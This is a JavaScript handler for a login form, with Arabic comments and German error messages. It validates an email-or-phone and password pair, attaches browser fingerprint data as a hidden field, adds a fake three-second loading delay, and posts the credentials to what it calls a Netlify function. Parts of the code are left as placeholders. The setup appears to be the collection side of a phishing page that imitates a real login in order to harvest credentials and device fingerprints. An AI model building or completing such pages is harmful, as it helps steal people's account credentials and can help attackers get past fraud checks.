/* --- login.js --- */
document.addEventListener('DOMContentLoaded', function() {
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailGroup = document.getElementById('emailGroup');
    const passwordGroup = document.getElementById('passwordGroup');
    const form = document.getElementById('loginForm');
    const btnNext = document.getElementById('btnNext');

    // ... (باقي كود الدالة isValidEmailOrPhone ومنطق الحقول العائمة - لم يتغير) ...
    // (يجب أن تنسخ الأكواد التي قدمتها سابقاً لهذه الأجزاء هنا)

    // ... (منطق الحقول العائمة) ...
    const emailWrapper = emailInput.parentElement;
    const passwordWrapper = passwordInput.parentElement;
    
    // 1. دالة التحقق المتقدمة (Email ODER Phone)
    function isValidEmailOrPhone(input) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^\+?[\d\s\-\(\)]{8,}$/;
        return emailRegex.test(input) || phoneRegex.test(input);
    }
    
    // 2. منطق الحقول العائمة (تم اختصاره هنا - يجب أن تضعه كاملاً)
    // ...

    // 3. منطق التحقق والإرسال
    form.addEventListener('submit', function(e) {
        e.preventDefault(); // نمنع الإرسال المباشر للتحكم فيه

        const emailVal = emailInput.value.trim();
        const passVal = passwordInput.value.trim();
        let hasError = false;

        // التحقق من الإيميل وكلمة المرور
        if (!emailVal || !isValidEmailOrPhone(emailVal)) {
            emailGroup.classList.add('error');
            emailGroup.querySelector('.error-text').textContent = 'Ungültige E-Mail- oder Telefonnummer.';
            hasError = true;
        } else {
            emailGroup.classList.remove('error');
        }

        if (!passVal) {
            passwordGroup.classList.add('error');
            hasError = true;
        } else {
            passwordGroup.classList.remove('error');
        }
        
        if (hasError) {
            return; 
        }
        
        // 4. جمع بيانات البصمة وإضافتها
        if (typeof Security !== 'undefined' && Security.getFingerprint) {
            const fpData = Security.getFingerprint();
            const fpInput = document.createElement('input');
            fpInput.type = 'hidden';
            fpInput.name = 'security_fingerprint';
            // نحول الكائن إلى سلسلة JSON لإرسالها
            fpInput.value = JSON.stringify(fpData);
            form.appendChild(fpInput);
            console.log("Fingerprint data attached.");
        } else {
            console.warn("Security check object not found.");
        }


        // 5. بدء التحميل والإرسال
        btnNext.classList.add('loading');

        // الانتظار 3 ثواني ثم الإرسال
        setTimeout(() => {
            btnNext.classList.remove('loading');
            form.submit(); // إرسال النموذج إلى دالة Netlify
        }, 3000); 
    });
});
